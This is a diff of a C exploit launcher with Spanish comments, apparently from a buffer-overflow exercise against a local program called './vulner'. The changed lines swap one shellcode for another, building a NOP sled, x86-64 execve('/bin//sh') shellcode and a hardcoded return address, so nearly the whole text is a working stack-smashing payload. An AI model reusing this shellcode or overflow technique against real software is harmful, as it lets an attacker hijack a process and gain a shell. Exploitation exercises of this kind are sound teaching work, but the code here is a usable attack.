@@ -4,25 +4,31 @@
 
 int main() {
     char *programVul = "./vulner";  // Programa a ejecutar
-    int debugueando = 1;// a 1 para ejecutar con gdb
+    int debugueando = 0;// a 1 para ejecutar con gdb
     char *debugguer= "gdb";  // El debuguer que quieras usar
         unsigned char shellcode[] =
-        //PRIMERO LA SHELL ENTERA:
-    "\x48\x31\xD2" //xor rdx
-    "\x48\x31\xc9"//xor rcx, rcx
-        "\x48\xf7\xe1"//mul rcx
-        "\x04\x3b"//add al, 0x3b
-        "\x48\xbb"//mov rbx, <value>
-        "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53"
-    "\x54\x5f\x52\x57\x54\x5e"
-        "\x0f\x05"//syscall//syscall
+        //PRIMERO UN POCO DE RELLENO:
+
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90"
+        //Shelcode:
+        "\x48\x31\xd2"  //xor  rdx,
+        "\x48\x31\xc0"  //xor rax rax
+        "\x52"                  // push   rdx
+        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"//movrbx,/bin//sh
+        "\x53"                  // push   rbx
+        "\x48\x89\xe7"  // mov    rdi, rsp
+        "\x52"                  // push   rdx
+        "\x57"          // push   rdi
+        "\x48\x89\xe6"  // mov    rsi, rsp
+        "\xb0\x3b"              // mov    al, 59 (execve syscall FreeBSD)
+        "\x0f\x05"              // syscall
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90"
         //DESPUES EL RELLENO
-    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
-    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
-    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
-    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
-    "\xac"
         //PARA TERMINAR LA DIRECCION A LA QUE SALTAR:
+        //ooo
     "\x40\xd9\xff\xff\xff\x7f";// direccion de memoria a la que saltar
 
 
